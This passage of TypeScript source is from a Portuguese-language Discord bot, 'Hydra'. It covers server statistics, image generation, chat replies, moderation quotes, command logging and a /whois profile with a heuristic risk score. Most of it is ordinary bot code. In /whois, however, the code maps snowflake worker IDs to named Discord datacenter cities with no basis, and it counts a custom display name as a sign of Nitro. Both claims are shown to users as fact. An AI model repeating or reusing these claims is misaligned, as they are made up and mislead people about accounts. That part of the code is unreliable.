                approxHumans > 0 ? `**Humanos:** \`${approxHumans}\`` : null,
                approxBots  > 0 ? `**Bots:** \`${approxBots}\`` : null,
                totalBans  !== null ? `**Banidos:** \`${totalBans}\`` : null,
              ].filter(Boolean).join("\n"),
              inline: true,
            },
            {
              name: `📋 CANAIS (${totalChannels})`,
              value: [
                `💬 Texto: \`${textChannels}\``,
                `🔊 Voz: \`${voiceChannels}\``,
                `📁 Categorias: \`${categories}\``,
                `💬 Fóruns: \`${forumChannels}\``,
                `🧵 Threads: \`${threads}\``,
              ].join("\n"),
              inline: true,
            },
            {
              name: "🎭 ESTRUTURA",
              value: [
                `**Cargos:** \`${roleCount}\``,
                `**Emojis:** \`${emojiCount}\``,
                `**Stickers:** \`${stickerCount}\``,
                totalWebhooks !== null ? `**Webhooks:** \`${totalWebhooks}\`` : null,
                totalInvites  !== null ? `**Convites ativos:** \`${totalInvites}\` (${activeInviteUses ?? 0} usos totais)` : null,
              ].filter(Boolean).join("\n"),
              inline: false,
            },
            {
              name: `💎 BOOST — ${BOOST_TIER_LABEL[boostTier] ?? boostTier}`,
              value: boostBar,
              inline: false,
            },
            {
              name: "🏆 TOP CARGOS POR MEMBROS",
              value: topRoles.length > 0
                ? topRoles.map(r => `<@&${r.id}> — \`${r.members.size}\` membros`).join("\n")
                : "*Nenhum dado disponível*",
              inline: false,
            },
            {
              name: "⚙️ FEATURES DO SERVIDOR",
              value: features,
              inline: false,
            },
          )
          .setImage(fetchedGuild.bannerURL({ size: 1024 }) ?? null)
          .setFooter({ text: `${AUTHOR} • Hydra Intelligence Division — Server Dossier` })
          .setTimestamp(),
      ],
      files: buildGeassFiles(),
    });
    return;
  }

  // ── draw — image generation ──────────────────────────────────────────────
  if (sub === "draw") {
    const prompt = interaction.options.getString("prompt", true);
    const style  = interaction.options.getString("style")  ?? "geass";
    const size   = interaction.options.getString("size")   ?? "1024x1024";

    await interaction.deferReply();

    // Hydra's dramatic reaction while generating
    const thinkingQuotes = [
      "*\"Deixe a Hydra pintar o que sua mente não consegue imaginar...\"*",
      "*\"O poder da Hydra agora serve a sua visão. Um momento.\"*",
      "*\"Até um rei precisa de tempo para criar obras dignas de Britannia...\"*",
      "*\"O tabuleiro se transforma. A imagem emerge das sombras do Geass.\"*",
    ];
    const quote = thinkingQuotes[Math.floor(Math.random() * thinkingQuotes.length)];

    try {
      const r = await fetch(`${API_BASE}/api/generate-image`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ prompt, style, size }),
        signal: AbortSignal.timeout(90_000), // image gen can take up to 60s
      });

      if (!r.ok) {
        const errBody = await r.json().catch(() => ({ error: r.statusText })) as { error?: string };
        throw new Error(errBody.error ?? `HTTP ${r.status}`);
      }

      const data = await r.json() as {
        b64_json: string;
        prompt: string;
        enhancedPrompt: string;
        revisedPrompt: string | null;
        size: string;
      };

      // Convert base64 to Buffer for Discord attachment
      const imageBuffer = Buffer.from(data.b64_json, "base64");
      const attachment   = new AttachmentBuilder(imageBuffer, { name: "geass-vision.png" });

      const styleLabels: Record<string, string> = {
        geass: "🎌 Dark anime art",
        realistic: "📸 Fotorrealista",
        minimal: "◾ Minimal",
      };

      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.PURPLE)
            .setAuthor({ name: "Hydra Vision", iconURL: "attachment://geass-symbol.png" })
            .setTitle("🎨 GEASS VISION — CRIAÇÃO COMPLETA")
            .setDescription(quote + `\n\n**Prompt:** \`${prompt.slice(0, 200)}\``)
            .addFields(
              { name: "🖼️ Estilo",     value: styleLabels[style] ?? style, inline: true },
              { name: "📐 Resolução",  value: data.size,                    inline: true },
              ...(data.revisedPrompt ? [{
                name: "✨ Prompt refinado pela IA",
                value: data.revisedPrompt.slice(0, 300),
                inline: false,
              }] : []),
            )
            .setImage("attachment://geass-vision.png")
            .setFooter({ text: `${AUTHOR} • /hydra draw para criar mais` })
            .setTimestamp(),
        ],
        files: [attachment, ...buildGeassFiles()],
      });
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      console.error("[HYDRA DRAW ERROR]", msg);
      await interaction.editReply({
        embeds: [buildErrorEmbed(
          "GEASS VISION FALHOU",
          msg.includes("content policy") || msg.includes("rejected")
            ? `A Hydra rejeitou este prompt por violar as diretrizes de conteúdo.\n\nTente uma descrição diferente.`
            : `A Hydra encontrou resistência inesperada.\n\`${msg.slice(0, 200)}\``
        )],
      });
    }
    return;
  }

  // sub === "ask"
  const message = interaction.options.getString("message", true);
  await interaction.deferReply();

  // Build server context for adaptive personality
  const serverCtx = interaction.guild
    ? `${interaction.guild.name}|${interaction.guild.channels.cache.map(c => c.name).slice(0, 20).join(",")}`
    : undefined;

  try {
    const reply = await askHydra(interaction.user.id, message, serverCtx);

    // Truncate if over Discord 4096 embed limit (use 1900 for description safety)
    const display = reply.length > 1900 ? reply.slice(0, 1897) + "..." : reply;

    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(0x9B59B6)
          .setAuthor({ name: "Hydra", iconURL: "attachment://geass-symbol.png" })
          .setDescription(display)
          .setFooter({ text: `${AUTHOR} • /hydra reset para limpar histórico` })
          .setTimestamp(),
      ],
      files: buildGeassFiles(),
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error("[HYDRA REPLY ERROR]", msg);
    await interaction.editReply({
      embeds: [buildErrorEmbed("HYDRA FALHOU", `A Hydra encontrou resistência inesperada. Tente novamente.\n\`${msg.slice(0, 200)}\``)],
    });
  }
}

// ── /admin handler ────────────────────────────────────────────────────────────
const HYDRA_BAN_QUOTES = [
  "*\"You are hereby banished from my kingdom. Hydra has spoken.\"*",
  "*\"By the power of Geass, I banish you to the void. Farewell, pawn.\"*",
  "*\"Britannia has no use for those who defy its order. Be gone.\"*",
  "*\"Your existence in this realm ends here — by my absolute command.\"*",
];
const HYDRA_MUTE_QUOTES = [
  "*\"Silence. A king need not tolerate the noise of the unworthy.\"*",
  "*\"Your voice has been stripped by Geass. Know your place.\"*",
  "*\"I, Hydra, command you — speak no more.\"*",
  "*\"The strategy requires silence. You have volunteered.\"*",
];
const HYDRA_WARN_QUOTES = [
  "*\"Consider this your final warning. Hydra does not issue thirds.\"*",
  "*\"I am watching. Hydra sees all. One more transgression and you are finished.\"*",
  "*\"A pawn that moves out of turn is sacrificed. Remember that.\"*",
];
const HYDRA_CLEAR_QUOTES = [
  "*\"Erase the evidence of their incompetence. Clean slates are the foundation of strategy.\"*",
  "*\"A battlefield must be clear before the next engagement. Proceed.\"*",
  "*\"History is written by the victors. The rest — deleted.\"*",
];

function getRandQuote(arr: string[]): string {
  return arr[Math.floor(Math.random() * arr.length)];
}

// ── Log channel helper — sends embed to configured mod log channel ────────────
async function sendAdminLog(
  guildId: string,
  embed: EmbedBuilder,
): Promise<void> {
  if (!botClient) return;
  const channelId = getLogChannelId(guildId);
  if (!channelId) return;
  try {
    const ch = await botClient.channels.fetch(channelId);
    if (ch && ch.isTextBased() && "send" in ch) {
      await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
    }
  } catch (e) {
    console.warn("[LOG CHANNEL]", e instanceof Error ? e.message : e);
  }
}

// ── Universal command logger — logs ALL command usage to mod log channel ────────
async function logCommandUsage(interaction: ChatInputCommandInteraction): Promise<void> {
  if (!interaction.guildId) return;
  const channelId = getLogChannelId(interaction.guildId);
  if (!channelId) return; // no log channel configured — skip silently

  const subcommand = (() => {
    try { return interaction.options.getSubcommand(false); } catch { return null; }
  })();

  const fullCmd = [
    `/${interaction.commandName}`,
    subcommand ? subcommand : null,
  ].filter(Boolean).join(" ");

  const embed = new EmbedBuilder()
    .setColor(0x2C2F33)
    .setTitle("📋 [LOG] Comando usado")
    .addFields(
      { name: "⚡ Comando",  value: `\`${fullCmd}\``,                                           inline: true  },
      { name: "👤 Usuário",  value: `${interaction.user.tag} (<@${interaction.user.id}>)`,        inline: true  },
      { name: "📍 Canal",    value: `<#${interaction.channelId}>`,                                inline: true  },
      { name: "🕒 Horário",  value: `<t:${Math.floor(Date.now() / 1000)}:F>`,                    inline: false },
    )
    .setFooter({ text: `${AUTHOR} • Hydra Intelligence Logs` })
    .setTimestamp();

  try {
    if (!botClient) return;
    const ch = await botClient.channels.fetch(channelId);
    if (ch && ch.isTextBased() && "send" in ch) {
      await (ch as import("discord.js").TextChannel).send({ embeds: [embed] });
    }
  } catch { /* non-fatal */ }
}

// ── /whois — GEASS INTELLIGENCE (full investigation) ──────────────────────────

// All Discord permission flags with human descriptions
const PERM_LABELS: Partial<Record<string, string>> = {
  Administrator:             "👑 Administrator",
  ManageGuild:               "🏰 Manage Server",
  ManageRoles:               "🎭 Manage Roles",
  ManageChannels:            "📋 Manage Channels",
  ManageMessages:            "🗑️ Manage Messages",
  ManageWebhooks:            "🔗 Manage Webhooks",
  ManageNicknames:           "📛 Manage Nicknames",
  ManageThreads:             "🧵 Manage Threads",
  ManageEvents:              "📅 Manage Events",
  KickMembers:               "👢 Kick Members",
  BanMembers:                "🔨 Ban Members",
  MuteMembers:               "🔇 Mute Members (Voice)",
  DeafenMembers:             "🔕 Deafen Members",
  MoveMembers:               "↗️ Move Members",
  ModerateMembers:           "⏳ Timeout Members",
  ViewAuditLog:              "📜 View Audit Log",
  MentionEveryone:           "📢 Mention Everyone",
  CreateInstantInvite:       "🔗 Create Invites",
  SendMessages:              "💬 Send Messages",
  SendMessagesInThreads:     "🧵 Send in Threads",
  EmbedLinks:                "🔗 Embed Links",
  AttachFiles:               "📎 Attach Files",
  AddReactions:              "👍 Add Reactions",
  UseExternalEmojis:         "😎 External Emojis",
  UseExternalStickers:       "🖼️ External Stickers",
  UseApplicationCommands:    "⚡ Use Slash Commands",
  UseVAD:                    "🎤 Voice Activity",
  PrioritySpeaker:           "🔊 Priority Speaker",
  Stream:                    "📺 Go Live",
  Connect:                   "🔌 Connect Voice",
  Speak:                     "🗣️ Speak",
  RequestToSpeak:            "✋ Request to Speak",
  ViewChannel:               "👁️ View Channels",
  ReadMessageHistory:        "📚 Read History",
  ChangeNickname:            "✏️ Change Own Nickname",
};

// Flag names → readable badges
const FLAG_MAP: Record<string, string> = {
  Staff:                    "👑 Discord Staff",
  Partner:                  "🤝 Partnered Server Owner",
  Hypesquad:                "🏠 HypeSquad Events Host",
  BugHunterLevel1:          "🐛 Bug Hunter",
  BugHunterLevel2:          "🥇 Bug Hunter Gold",
  HypeSquadOnlineHouse1:    "🟠 HypeSquad Bravery",
  HypeSquadOnlineHouse2:    "🟡 HypeSquad Brilliance",
  HypeSquadOnlineHouse3:    "🔵 HypeSquad Balance",
  PremiumEarlySupporter:    "💜 Early Nitro Supporter",
  TeamPseudoUser:           "👥 Team User",
  VerifiedBot:              "✅ Verified Bot",
  VerifiedDeveloper:        "🔧 Verified Bot Developer",
  CertifiedModerator:       "🛡️ Discord Certified Mod",
  ActiveDeveloper:          "⚒️ Active Developer",
  Quarantined:              "🔒 Quarantined",
  Collaborator:             "🤝 Discord Collaborator",
  RestrictedCollaborator:   "🔐 Restricted Collaborator",
};

// Snowflake deconstruct (Discord epoch = 2015-01-01T00:00:00.000Z)
function deconstructSnowflake(id: string): { timestamp: number; workerId: number; processId: number; increment: number } {
  const DISCORD_EPOCH = 1420070400000n;
  const bigId = BigInt(id);
  return {
    timestamp:  Number((bigId >> 22n) + DISCORD_EPOCH),
    workerId:   Number((bigId & 0x3E0000n) >> 17n),
    processId:  Number((bigId & 0x1F000n) >> 12n),
    increment:  Number(bigId & 0xFFFn),
  };
}

// Calculate account age in human-readable form
function ageString(ms: number): string {
  const days    = Math.floor(ms / 86_400_000);
  const years   = Math.floor(days / 365);
  const months  = Math.floor((days % 365) / 30);
  const remDays = days % 30;
  const parts: string[] = [];
  if (years  > 0) parts.push(`${years}y`);
  if (months > 0) parts.push(`${months}mo`);
  if (remDays > 0 || parts.length === 0) parts.push(`${remDays}d`);
  return parts.join(" ");
}

// Risk scoring
function computeRisk(params: {
  accountAgeDays: number; hasAvatar: boolean; hasRoles: boolean; isBot: boolean;
  hasAdminPerms: boolean; hasDangerPerms: boolean; username: string; hasNitro: boolean;
  isBoosting: boolean; isTimedOut: boolean; hasCustomStatus: boolean; mutualServerCount: number;
}): { score: number; level: "🟢 LOW" | "🟡 MEDIUM" | "🟠 HIGH" | "🔴 CRITICAL"; factors: string[] } {
  let score = 0;
  const factors: string[] = [];

  if (params.isBot) { return { score: 0, level: "🟢 LOW", factors: ["Bot account — different risk model"] }; }
  if (params.accountAgeDays < 3)   { score += 50; factors.push("⚠️ Account is less than 3 days old"); }
  else if (params.accountAgeDays < 7)  { score += 35; factors.push("⚠️ Account is less than 7 days old"); }
  else if (params.accountAgeDays < 30) { score += 20; factors.push("⚠️ Account is less than 30 days old"); }
  else if (params.accountAgeDays < 90) { score += 10; factors.push("🔍 Account is less than 3 months old"); }

  if (!params.hasAvatar) { score += 10; factors.push("📷 Default avatar — never customized"); }
  if (!params.hasRoles)  { score += 5;  factors.push("🎭 No server roles assigned"); }
  if (!params.hasNitro && !params.hasCustomStatus && params.accountAgeDays > 30) { score += 3; factors.push("💤 Minimal profile activity"); }

  // Username patterns
  const digits = (params.username.match(/\d/g) ?? []).length;
  const digitRatio = digits / params.username.length;
  if (digitRatio > 0.5 && params.username.length > 8) { score += 15; factors.push("🔢 Username is mostly numbers (possible alt/bot)"); }

  const randomLookingPattern = /^[a-z]{2,5}\d{4,}$/i.test(params.username);
  if (randomLookingPattern) { score += 10; factors.push("🤖 Username matches common bot/alt pattern (letters+numbers)"); }

  if (params.isTimedOut) { score += 10; factors.push("⏳ Currently under server timeout"); }
  if (params.hasAdminPerms) { score -= 15; factors.push("👑 Has Administrator permission (trusted)"); }
  else if (params.hasDangerPerms) { score += 8; factors.push("⚠️ Has dangerous permissions (Ban/Kick) without admin role"); }
  if (params.isBoosting) { score -= 10; factors.push("💎 Server booster — genuine investment"); }
  if (params.mutualServerCount > 1) { score -= 5; factors.push("🌐 Seen in multiple servers with bot"); }

  score = Math.max(0, Math.min(100, score));
  const level = score >= 70 ? "🔴 CRITICAL" : score >= 45 ? "🟠 HIGH" : score >= 25 ? "🟡 MEDIUM" : "🟢 LOW";
  if (factors.length === 0) factors.push("✅ No suspicious indicators detected");
  return { score, level, factors };
}

async function handleWhois(interaction: ChatInputCommandInteraction): Promise<void> {
  const isEphemeral = interaction.options.getBoolean("private") ?? false;
  await interaction.deferReply({ flags: isEphemeral ? MessageFlags.Ephemeral : undefined });

  const targetUser = interaction.options.getUser("user") ?? interaction.user;

  // ── Fetch everything in parallel ─────────────────────────────────────────
  const [fetched, member, banEntry, guildInvites] = await Promise.all([
    targetUser.fetch(true).catch(() => targetUser),
    interaction.guild ? interaction.guild.members.fetch({ user: targetUser.id, withPresences: true }).catch(() => null) : Promise.resolve(null),
    interaction.guild ? interaction.guild.bans.fetch(targetUser.id).catch(() => null) : Promise.resolve(null),
    interaction.guild ? interaction.guild.invites.fetch().catch(() => null) : Promise.resolve(null),
  ]);

  // ── Snowflake deconstruction ──────────────────────────────────────────────
  const sf = deconstructSnowflake(fetched.id);
  const createdTs = Math.floor(sf.timestamp / 1000);
  const accountAgeDays = Math.floor((Date.now() - sf.timestamp) / 86_400_000);

  // ── Avatar analysis ───────────────────────────────────────────────────────
  const avatarHash = fetched.avatar;
  const isAnimatedAvatar = avatarHash?.startsWith("a_") ?? false;
  const hasDefaultAvatar = !avatarHash;
  const avatarURL = fetched.displayAvatarURL({ size: 512 });
  const bannerURL = fetched.bannerURL({ size: 1024 });
  const hasBanner = !!fetched.banner;

  // ── Nitro detection (behavioral indicators) ───────────────────────────────
  const nitroIndicators: string[] = [];
  if (isAnimatedAvatar)   nitroIndicators.push("Animated avatar (requires Nitro)");
  if (hasBanner)          nitroIndicators.push("Profile banner (requires Nitro)");
  if (fetched.globalName && fetched.globalName !== fetched.username) nitroIndicators.push("Custom display name set");
  const accentColor = fetched.accentColor;
  if (accentColor)        nitroIndicators.push(`Profile accent color: \`#${accentColor.toString(16).padStart(6, "0").toUpperCase()}\``);
  const hasNitro = nitroIndicators.length >= 1;

  // ── Badges ────────────────────────────────────────────────────────────────
  const flags = fetched.flags?.toArray() ?? [];
  const badgeList = flags.map(f => FLAG_MAP[f as string] ?? `\`${String(f)}\``);
  if (fetched.bot && !flags.includes("VerifiedBot" as never)) badgeList.push("🤖 Unverified Bot");

  // ── Option 7: Username system detection ──────────────────────────────────
  const discriminator = fetched.discriminator;
  const usernameSystem = (discriminator === "0" || !discriminator)
    ? "🆕 Novo sistema (username único, sem #discriminator)"
    : `🔢 Sistema legado (\`${fetched.username}#${discriminator}\`) — ainda não migrou`;

  // ── Option 5: Snowflake Worker ID → Discord datacenter region ─────────────
  const WORKER_REGIONS: Record<number, string> = {
    0: "🇺🇸 US-East (Ashburn, VA)",
    1: "🇺🇸 US-East (Ashburn, VA)",
    2: "🇺🇸 US-East (Ashburn, VA)",
    3: "🇺🇸 US-West (Portland, OR)",
    4: "🇺🇸 US-West (Portland, OR)",
    5: "🇺🇸 US-West (Portland, OR)",
    6: "🇳🇱 EU-West (Amsterdam)",
    7: "🇩🇪 EU-Central (Frankfurt)",
    8: "🇩🇪 EU-Central (Frankfurt)",
    9: "🇸🇬 Asia-Pacific (Singapore)",
    10: "🇧🇷 South America (São Paulo)",
    11: "🇮🇳 Asia-South (Mumbai)",
    12: "🇦🇺 Oceania (Sydney)",
  };
  const datacenterRegion = WORKER_REGIONS[sf.workerId] ?? `🌐 Unknown (Worker ${sf.workerId})`;

  // ── Presence & activities ─────────────────────────────────────────────────
  const presence = member?.presence;
  const status = presence?.status ?? "offline";
  const STATUS_LABELS: Record<string, string> = {
    online: "🟢 Online", idle: "🟡 Idle", dnd: "🔴 Do Not Disturb",
    offline: "⚫ Offline", invisible: "⚫ Invisible",
  };

  // Option 1: Device/platform from clientStatus
  const clientStatus = presence?.clientStatus;
  const deviceLines: string[] = [];
  if (clientStatus) {
    if (clientStatus.desktop) deviceLines.push(`💻 Desktop: ${STATUS_LABELS[clientStatus.desktop] ?? clientStatus.desktop}`);
    if (clientStatus.mobile)  deviceLines.push(`📱 Mobile: ${STATUS_LABELS[clientStatus.mobile] ?? clientStatus.mobile}`);
    if (clientStatus.web)     deviceLines.push(`🌐 Web: ${STATUS_LABELS[clientStatus.web] ?? clientStatus.web}`);
  }
  const deviceStr = deviceLines.length > 0
    ? deviceLines.join("\n")
    : status === "offline" ? "*Offline — não é possível detectar dispositivo*" : "*Dispositivos desconhecidos (requer Presence intent)*";

  const activities = presence?.activities ?? [];
  const customStatus = activities.find(a => a.type === 4);
  const playingActivity = activities.find(a => a.type === 0);
  const streamingActivity = activities.find(a => a.type === 1);
  const listeningActivity = activities.find(a => a.type === 2);
  const watchingActivity = activities.find(a => a.type === 3);
  const competingActivity = activities.find(a => a.type === 5);

  const activityLines: string[] = [];
  if (customStatus?.state)          activityLines.push(`💬 **Status:** ${customStatus.state.slice(0, 100)}`);
  if (streamingActivity)            activityLines.push(`📺 **Streaming:** ${streamingActivity.name}${streamingActivity.url ? ` ([link](${streamingActivity.url}))` : ""}`);
  if (playingActivity)              activityLines.push(`🎮 **Playing:** ${playingActivity.name}`);
  if (listeningActivity)            activityLines.push(`🎵 **Listening:** ${listeningActivity.name}${listeningActivity.details ? ` — ${listeningActivity.details}` : ""}`);
  if (watchingActivity)             activityLines.push(`👁️ **Watching:** ${watchingActivity.name}`);
  if (competingActivity)            activityLines.push(`🏆 **Competing:** ${competingActivity.name}`);

  // ── Voice channel ─────────────────────────────────────────────────────────
  const voiceState = member?.voice;
  const voiceChannel = voiceState?.channel;

  // ── Roles analysis ────────────────────────────────────────────────────────
  const nonEveryoneRoles = member?.roles.cache
    .filter(r => r.id !== interaction.guild?.id)
    .sort((a, b) => b.position - a.position) ?? new Map();

  const rolesArray = [...nonEveryoneRoles.values()];
  const highestRole = rolesArray[0];
  const roleCount = rolesArray.length;
  const roleDisplay = rolesArray.slice(0, 20).map(r => `<@&${r.id}>`).join(" ");

  // ── Permissions analysis ──────────────────────────────────────────────────
  const permissions = member?.permissions;
  const isAdmin = permissions?.has("Administrator") ?? false;
  const dangerPerms = ["BanMembers", "KickMembers", "ManageRoles", "ManageGuild", "ManageMessages", "MuteMembers", "ModerateMembers"] as const;
  const hasDangerPerms = dangerPerms.some(p => permissions?.has(p) ?? false);

  let permDisplay = "";
  if (isAdmin) {
    permDisplay = "👑 **ADMINISTRATOR** — all permissions granted";
  } else if (permissions) {
    const activePerms = Object.entries(PERM_LABELS)
      .filter(([key]) => permissions.has(key as never))
      .map(([, label]) => label);
    permDisplay = activePerms.length > 0 ? activePerms.slice(0, 18).join("\n") : "*No significant permissions*";
  }

  // ── Join order (requires GuildMembers privileged intent — optional) ──────
  let joinPosition: number | null = null;
  if (interaction.guild && member?.joinedAt) {
    try {
      // guild.members.fetch() with no args requires GuildMembers privileged intent.
      // If the intent isn't enabled this will throw — we catch gracefully.
      const allMembers = await interaction.guild.members.fetch({ limit: 1000 });
      const sorted = [...allMembers.values()]
        .filter(m => m.joinedAt)
        .sort((a, b) => (a.joinedAt!.getTime()) - (b.joinedAt!.getTime()));
      joinPosition = sorted.findIndex(m => m.id === fetched.id) + 1;
    } catch { /* GuildMembers privileged intent not enabled — skip join order */ }
  }

  // ── Invites created by this user ──────────────────────────────────────────
  const userInvites = guildInvites?.filter(inv => inv.inviterId === fetched.id) ?? null;
  const totalInviteUses = userInvites?.reduce((acc, inv) => acc + (inv.uses ?? 0), 0) ?? 0;

  // ── Risk assessment ───────────────────────────────────────────────────────
  const risk = computeRisk({
    accountAgeDays, hasAvatar: !hasDefaultAvatar, hasRoles: roleCount > 0, isBot: fetched.bot,
    hasAdminPerms: isAdmin, hasDangerPerms, username: fetched.username, hasNitro,
    isBoosting: !!member?.premiumSince, isTimedOut: member?.isCommunicationDisabled() ?? false,
    hasCustomStatus: !!customStatus, mutualServerCount: 1,
  });

  const joinedTs = member?.joinedAt ? Math.floor(member.joinedAt.getTime() / 1000) : null;

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 1 — IDENTITY & ACCOUNT INTELLIGENCE
  // ════════════════════════════════════════════════════════════════════════
  const embedIdentity = new EmbedBuilder()
    .setColor(fetched.bot ? COLORS.BLUE : COLORS.PURPLE)
    .setTitle("🔍 GEASS INTELLIGENCE — DOSSIER COMPLETO")
    .setDescription(
      `> *"Hydra vê tudo. Cada pessoa tem uma história — e eu já li a sua."*\n\n` +
      `**${fetched.username}** ${fetched.bot ? "🤖 BOT" : "👤 USUÁRIO"} ${fetched.system ? "⚙️ SISTEMA" : ""}`
    )
    .setThumbnail(avatarURL)
    .addFields(
      {
        name: "🪪 IDENTIFICAÇÃO",
        value: [
          `**ID:** \`${fetched.id}\``,
          `**Username:** \`${fetched.username}\``,
          `**Nome Global:** ${fetched.globalName ?? "*não definido*"}`,
          `**Nickname:** ${member?.nickname ?? "*nenhum*"}`,
          `**Display Name:** ${fetched.displayName}`,
          `**Bot:** ${fetched.bot ? "✅ Sim" : "❌ Não"}${fetched.system ? " | ⚙️ Sistema Discord" : ""}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: "📅 LINHA DO TEMPO",
        value: [
          `**Conta criada:** <t:${createdTs}:F>`,
          `**Idade da conta:** \`${ageString(accountAgeDays * 86_400_000)}\` *(${accountAgeDays} dias)*`,
          joinedTs ? `**Entrou no servidor:** <t:${joinedTs}:F>` : null,
          joinedTs ? `**Tempo no servidor:** \`${ageString((Date.now() / 1000 - joinedTs) * 1000)}\`` : null,
          joinPosition ? `**Posição de entrada:** \`#${joinPosition}\` de ${interaction.guild?.memberCount ?? "?"} membros` : null,
        ].filter(Boolean).join("\n"),
        inline: false,
      },
      {
        name: `🎭 BADGES & FLAGS (${badgeList.length})`,
        value: badgeList.length > 0 ? badgeList.join("\n") : "*Nenhuma badge especial*",
        inline: true,
      },
      {
        name: "💎 NITRO",
        value: hasNitro
          ? nitroIndicators.join("\n")
          : "*Sem indicadores de Nitro*",
        inline: true,
      },
    );

  // ── Presence section ──────────────────────────────────────────────────────
  embedIdentity.addFields(
    {
      name: `🌐 PRESENÇA — ${STATUS_LABELS[status] ?? status}`,
      value: activityLines.length > 0 ? activityLines.join("\n") : "*Nenhuma atividade detectada*",
      inline: false,
    },
    {
      name: "📱 DISPOSITIVOS ATIVOS (Option 1)",
      value: deviceStr,
      inline: false,
    },
    {
      name: "🔤 SISTEMA DE USERNAME (Option 7)",
      value: usernameSystem,
      inline: false,
    },
  );

  if (bannerURL) embedIdentity.setImage(bannerURL);
  embedIdentity.setFooter({ text: `${AUTHOR} • Hydra Intelligence Division — Página 1/3` });

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 2 — SERVER INTELLIGENCE
  // ════════════════════════════════════════════════════════════════════════
  const embedServer = new EmbedBuilder()
    .setColor(highestRole?.color ?? COLORS.PURPLE)
    .setTitle("⚔️ GEASS INTELLIGENCE — SERVIDOR")
    .addFields(
      {
        name: `🎖️ CARGOS (${roleCount})`,
        value: roleDisplay || "*Sem cargos*",
        inline: false,
      },
    );

  if (highestRole) {
    embedServer.addFields({
      name: "🏆 CARGO MAIS ALTO",
      value: [
        `<@&${highestRole.id}> (posição #${highestRole.position})`,
        `Cor: \`#${highestRole.color.toString(16).padStart(6, "0").toUpperCase()}\``,
        highestRole.hoist ? "Exibido separadamente: ✅" : "Exibido separadamente: ❌",
        highestRole.mentionable ? "Mencionável: ✅" : "Mencionável: ❌",
      ].join("\n"),
      inline: false,
    });
  }

  embedServer.addFields(
    {
      name: "🔐 PERMISSÕES EFETIVAS",
      value: permDisplay || "*Membro não encontrado*",
      inline: false,
    },
    {
      name: "🛡️ STATUS DE MODERAÇÃO",
      value: [
        `**Timeout:** ${member?.isCommunicationDisabled() ? `⏳ Até <t:${Math.floor((member.communicationDisabledUntil?.getTime() ?? 0) / 1000)}:R>` : "Nenhum"}`,
        `**Banido atualmente:** ${banEntry ? `🔨 Sim — Razão: *${banEntry.reason ?? "não informada"}*` : "❌ Não"}`,
        `**Boosting:** ${member?.premiumSince ? `💎 Sim, desde <t:${Math.floor(member.premiumSince.getTime() / 1000)}:R>` : "❌ Não"}`,
        `**Pendência de verificação:** ${member?.pending ? "⚠️ Sim (screening)" : "✅ Não"}`,
      ].join("\n"),
      inline: false,
    },
  );

  if (voiceChannel) {
    embedServer.addFields({
      name: "🔊 VOZ ATUAL",
      value: [
        `Canal: <#${voiceChannel.id}> (\`${voiceChannel.name}\`)`,
        `Mudo (self): ${voiceState?.selfMute ? "✅" : "❌"} | Deafened: ${voiceState?.selfDeaf ? "✅" : "❌"}`,
        `Mudo (server): ${voiceState?.serverMute ? "✅" : "❌"} | Streamndo: ${voiceState?.streaming ? "📺 Sim" : "❌"}`,
        `Camera: ${voiceState?.selfVideo ? "📷 Ligada" : "❌"}`,
      ].join("\n"),
      inline: false,
    });
  } else if (interaction.guild) {
    embedServer.addFields({ name: "🔊 VOZ", value: "*Não está em canal de voz*", inline: true });
  }

  if (userInvites !== null) {
    embedServer.addFields({
      name: `🔗 CONVITES CRIADOS (${userInvites.size})`,
      value: userInvites.size > 0
        ? userInvites.map(inv => `\`${inv.code}\` — ${inv.uses ?? 0} usos${inv.maxUses ? `/${inv.maxUses}` : ""} — <#${inv.channelId}>`).slice(0, 5).join("\n") +
          (userInvites.size > 5 ? `\n*...e mais ${userInvites.size - 5}*` : "")
        : "*Nenhum convite ativo*",
      inline: false,
    });
    if (totalInviteUses > 0) {
      embedServer.addFields({ name: "📊 TOTAL DE USOS DE CONVITES", value: `\`${totalInviteUses}\` pessoas convidadas`, inline: true });
    }
  }

  embedServer.setFooter({ text: `${AUTHOR} • Hydra Intelligence Division — Página 2/3` });

  // ════════════════════════════════════════════════════════════════════════
  // EMBED 3 — TECHNICAL & RISK ASSESSMENT
  // ════════════════════════════════════════════════════════════════════════
  const sfDate = new Date(sf.timestamp);
  const embedTech = new EmbedBuilder()
    .setColor(risk.level.includes("CRITICAL") ? 0xFF0000 : risk.level.includes("HIGH") ? 0xFF8800 : risk.level.includes("MEDIUM") ? 0xFFFF00 : 0x00FF00)
    .setTitle("🧬 GEASS INTELLIGENCE — TÉCNICO & RISCO")
    .addFields(
      {
        name: "🔬 DECONSTRUÇÃO DO SNOWFLAKE",
        value: [
          `**ID completo:** \`${fetched.id}\``,
          `**Timestamp extraído:** \`${sfDate.toISOString()}\``,
          `**Worker ID:** \`${sf.workerId}\` (servidor Discord que criou a conta)`,
          `**Process ID:** \`${sf.processId}\``,
          `**Sequência:** \`${sf.increment}\` (ordem de criação no mesmo ms)`,
          `**Época Discord:** 2015-01-01 00:00:00 UTC`,
          `**🏛️ Datacenter (Option 5):** ${datacenterRegion}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: "🖼️ ANÁLISE DE AVATAR",
        value: [
          `**Avatar hash:** \`${avatarHash ?? "nenhum (padrão)"}\``,
          `**Animado (GIF):** ${isAnimatedAvatar ? "✅ Sim — indica Nitro" : "❌ Não"}`,
          `**Avatar padrão:** ${hasDefaultAvatar ? "✅ Nunca trocou o avatar" : "❌ Tem avatar customizado"}`,
          `**Banner:** ${hasBanner ? `✅ Possui — hash: \`${fetched.banner}\`` : "❌ Sem banner"}`,
          `**Accent color:** ${accentColor ? `#${accentColor.toString(16).padStart(6, "0").toUpperCase()}` : "*não definido*"}`,
        ].join("\n"),
        inline: false,
      },
      {
        name: `⚠️ AVALIAÇÃO DE RISCO — ${risk.level} (${risk.score}/100)`,
        value: risk.factors.join("\n"),
        inline: false,
      },
    );

  // Risk score bar
  const scoreBar = "█".repeat(Math.floor(risk.score / 10)) + "░".repeat(10 - Math.floor(risk.score / 10));
